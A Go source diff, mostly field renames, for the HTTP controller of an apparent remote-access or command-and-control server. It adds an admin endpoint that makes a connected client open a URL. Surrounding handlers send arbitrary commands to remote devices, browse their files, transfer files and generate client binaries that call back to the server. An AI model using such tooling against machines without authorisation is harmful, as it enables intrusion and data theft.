@@ -23,14 +23,15 @@ import (
 )
 
 type httpController struct {
-	configuration  *environment.Configuration
-	logger         *logrus.Logger
-	authMiddleware *middleware.JWT
-	clientService  services.Client
-	systemService  services.System
-	userService    services.User
-	deviceService  services.Device
-	payloadService services.Payload
+	Configuration  *environment.Configuration
+	Logger         *logrus.Logger
+	AuthMiddleware *middleware.JWT
+	ClientService  services.Client
+	SystemService  services.System
+	UserService    services.User
+	DeviceService  services.Device
+	PayloadService services.Payload
+	UrlService     services.URL
 }
 
 func NewController(
@@ -42,16 +43,18 @@ func NewController(
 	systemService services.System,
 	payloadService services.Payload,
 	userService services.User,
-	deviceService services.Device) {
+	deviceService services.Device,
+	urlService services.URL) {
 	handler := &httpController{
-		configuration:  configuration,
-		authMiddleware: authMiddleware,
-		logger:         log,
-		clientService:  clientService,
-		payloadService: payloadService,
-		systemService:  systemService,
-		userService:    userService,
-		deviceService:  deviceService,
+		Configuration:  configuration,
+		AuthMiddleware: authMiddleware,
+		Logger:         log,
+		ClientService:  clientService,
+		PayloadService: payloadService,
+		SystemService:  systemService,
+		UserService:    userService,
+		DeviceService:  deviceService,
+		UrlService:     urlService,
 	}
 
 	router.NoRoute(handler.noRouteHandler)
@@ -93,6 +96,8 @@ func NewController(
 
 		auth.GET("/download/:filename", handler.downloadFileHandler)
 		auth.POST("/upload", handler.uploadFileHandler)
+
+		authAdmin.POST("/open-url", handler.openUrlHandler)
 	}
 }
 
@@ -113,9 +118,9 @@ func (h *httpController) loginHandler(c *gin.Context) {
 }
 
 func (h *httpController) getSettingsHandler(c *gin.Context) {
-	config, err := h.systemService.GetParams()
+	config, err := h.SystemService.GetParams()
 	if err != nil {
-		h.logger.Error(err)
+		h.Logger.Error(err)
 		c.Status(http.StatusInternalServerError)
 		return
 	}
@@ -126,9 +131,9 @@ func (h *httpController) getSettingsHandler(c *gin.Context) {
 }
 
 func (h *httpController) refreshTokenHandler(c *gin.Context) {
-	secret, err := h.systemService.RefreshSecretKey()
+	secret, err := h.SystemService.RefreshSecretKey()
 	if err != nil {
-		h.logger.Error(err.Error())
+		h.Logger.Error(err.Error())
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
@@ -147,12 +152,12 @@ func (h *httpController) getUserProfileHandler(c *gin.Context) {
 func (h *httpController) createUserHandler(c *gin.Context) {
 	var body entities.User
 	if err := c.ShouldBind(&body); err != nil {
-		h.logger.Warning(err)
+		h.Logger.Warning(err)
 		c.Status(http.StatusBadRequest)
 		return
 	}
 
-	if err := h.userService.Create(body); err != nil {
+	if err := h.UserService.Create(body); err != nil {
 		if err == services.ErrUserAlreadyExist {
 			c.Status(http.StatusNotModified)
 			return
@@ -168,12 +173,12 @@ func (h *httpController) createUserHandler(c *gin.Context) {
 func (h *httpController) updateUserPasswordHandler(c *gin.Context) {
 	var body UpdateUserPasswordRequestForm
 	if err := c.ShouldBind(&body); err != nil {
-		h.logger.Warning(err)
+		h.Logger.Warning(err)
 		c.Status(http.StatusBadRequest)
 		return
 	}
 
-	if err := h.userService.UpdatePassword(services.UpdateUserPasswordInput{
+	if err := h.UserService.UpdatePassword(services.UpdateUserPasswordInput{
 		Username:    body.Username,
 		OldPassword: body.OldPassword,
 		NewPassword: body.NewPassword,
@@ -182,11 +187,9 @@ func (h *httpController) updateUserPasswordHandler(c *gin.Context) {
 			c.JSON(http.StatusUnauthorized, gin.H{"error": err.Error()})
 			return
 		}
-
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
-
 	c.Status(http.StatusOK)
 	return
 }
@@ -194,7 +197,7 @@ func (h *httpController) updateUserPasswordHandler(c *gin.Context) {
 func (h *httpController) setDeviceHandler(c *gin.Context) {
 	var body entities.Device
 	if err := c.ShouldBindJSON(&body); err != nil {
-		h.logger.Warning(err)
+		h.Logger.Warning(err)
 		c.Status(http.StatusBadRequest)
 		return
 	}
@@ -208,21 +211,21 @@ func (h *httpController) setDeviceHandler(c *gin.Context) {
 		`arch`:       body.OSArch,
 	}
 
-	if err := h.deviceService.Insert(body); err != nil {
-		h.logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
+	if err := h.DeviceService.Insert(body); err != nil {
+		h.Logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
 		c.Status(http.StatusInternalServerError)
 		return
 	}
 
-	h.logger.WithFields(fields).Info(`Device available`)
+	h.Logger.WithFields(fields).Info(`Device available`)
 	c.Status(http.StatusOK)
 	return
 }
 
 func (h *httpController) getDevicesHandler(c *gin.Context) {
-	clients, err := h.deviceService.GetAllAvailable()
+	clients, err := h.DeviceService.GetAllAvailable()
 	if err != nil {
-		h.logger.Error(`Failed to get available devices`)
+		h.Logger.Error(`Failed to get available devices`)
 		c.Status(http.StatusInternalServerError)
 		return
 	}
@@ -247,7 +250,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
 	defer cancel()
 
-	payload, err := h.clientService.SendCommand(ctxWithTimeout, services.SendCommandInput{
+	payload, err := h.ClientService.SendCommand(ctxWithTimeout, services.SendCommandInput{
 		MacAddress: form.Address,
 		Request:    form.Command,
 	})
@@ -266,8 +269,7 @@ func (h *httpController) getCommandHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-
-	req, found := h.payloadService.Get(decoded)
+	req, found := h.PayloadService.Get(decoded)
 	if found {
 		c.JSON(http.StatusOK, req)
 		return
@@ -282,7 +284,7 @@ func (h *httpController) respondCommandHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
-	h.payloadService.Set(body.MacAddress, &services.PayloadData{
+	h.PayloadService.Set(body.MacAddress, &services.PayloadData{
 		Response:    body.Response,
 		HasError:    body.HasError,
 		HasResponse: true,
@@ -293,7 +295,7 @@ func (h *httpController) respondCommandHandler(c *gin.Context) {
 func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
 	c.HTML(http.StatusOK, "generate.html", gin.H{
 		"Address":  network.GetLocalIP(),
-		"Port":     strings.ReplaceAll(h.configuration.Server.Port, ":", ""),
+		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
 		"OSTarget": system.OSTargetMap,
 	})
 	return
@@ -311,7 +313,7 @@ func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
 		return
 	}
 
-	binary, err := h.clientService.BuildClient(services.BuildClientBinaryInput{
+	binary, err := h.ClientService.BuildClient(services.BuildClientBinaryInput{
 		ServerAddress: req.Address,
 		ServerPort:    req.Port,
 		OSTarget:      system.OSTargetIntMap[osTarget],
@@ -358,7 +360,8 @@ func (h *httpController) fileExplorerHandler(c *gin.Context) {
 
 	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
 	defer cancel()
-	payload, err := h.clientService.SendCommand(ctxWithTimeout, services.SendCommandInput{
+
+	payload, err := h.ClientService.SendCommand(ctxWithTimeout, services.SendCommandInput{
 		MacAddress: req.Address,
 		Request:    fmt.Sprint("explore ", path),
 	})
@@ -390,4 +393,18 @@ func (h *httpController) uploadFileHandler(c *gin.Context) {
 		return
 	}
 	c.String(http.StatusOK, file.Filename)
+}
+
+func (h *httpController) openUrlHandler(c *gin.Context) {
+	var req OpenUrlRequestForm
+	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
+		c.String(http.StatusBadRequest, err.Error())
+		return
+	}
+	if err := h.UrlService.OpenURL(c.Request.Context(), req.Address, req.URL); err != nil {
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+	c.Status(http.StatusOK)
+	return
 }
